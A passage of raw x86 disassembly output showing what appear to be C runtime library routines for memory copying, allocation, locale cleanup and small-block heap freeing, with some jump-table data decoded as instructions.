  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
